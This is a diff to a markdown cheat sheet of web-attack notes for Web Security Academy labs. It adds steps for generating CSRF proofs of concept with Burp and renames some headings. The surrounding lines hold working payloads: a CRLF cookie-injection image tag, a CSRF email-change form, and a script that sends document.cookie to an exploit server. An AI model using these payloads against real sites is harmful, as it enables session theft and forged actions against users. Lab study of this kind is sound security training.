@@ -239,7 +239,12 @@ Host: 0a35003b04de89b2824392b5001e00b4.web-security-academy.net
 ```
 ### :white_check_mark: Cross-site scripting (XSS)
 ### :white_check_mark: Cross-site request forge (CSRF)
-#### CSRF using Javascript fetch()
+
+#### Automated
+Find a request to CSRF, then right click : Engagement tool > Generate CRSF PoC. This produce a code sample that should can be exploited as is.
+
+#### Manual
+##### CSRF using Javascript fetch()
 ```
 <html>
     <img src="https://0a6c003b049f971980cc0d63006a00f7.web-security-academy.net/?search=aaa%3b%20SameSite=None%3b%20Secure%3b%20Partitioned%3b%0d%0aSet-Cookie:%20csrf=toto%3b%20SameSite=None%3b%20Secure%3bPartitioned%3b">
@@ -259,7 +264,7 @@ Host: 0a35003b04de89b2824392b5001e00b4.web-security-academy.net
 </html>
 ```
 
-#### CSRF using Javascript XMLHTTPRequest()
+##### CSRF using Javascript XMLHTTPRequest()
 ```
 // GET request
 const req = new XMLHttpRequest();
@@ -276,7 +281,7 @@ xhr = new XMLHttpRequest();
 xhr.open("GET", "https://exploit-0a0300fb04fc12638190ba2101d8001a.exploit-server.net/data?" + document.cookie);
 xhr.send();
 ```
-#### CSRF using Javascript HTML
+##### CSRF using Javascript HTML
 ```
 <html>
   <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
